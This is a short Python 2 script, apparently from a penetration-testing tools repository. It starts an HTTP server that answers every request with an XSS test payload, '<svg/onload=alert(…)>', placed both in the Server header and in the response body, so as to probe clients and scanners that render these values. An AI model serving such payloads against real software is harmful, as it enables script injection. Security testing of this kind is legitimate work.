"""
* https://github.com/BeLove/pentest-tools
* @sergeybelove
*
"""

from BaseHTTPServer import BaseHTTPRequestHandler,HTTPServer

class HttpProcessor(BaseHTTPRequestHandler):
    def do_GET(self):
	self.server_version = "<svg/onload=alert(1)>"
	self.send_response(200)
	self.send_header('content-type','text/html')
	self.end_headers()
	self.wfile.write("<svg/onload=alert(2)>")

serv = HTTPServer(("0.0.0.0",8000),HttpProcessor)
serv.serve_forever()

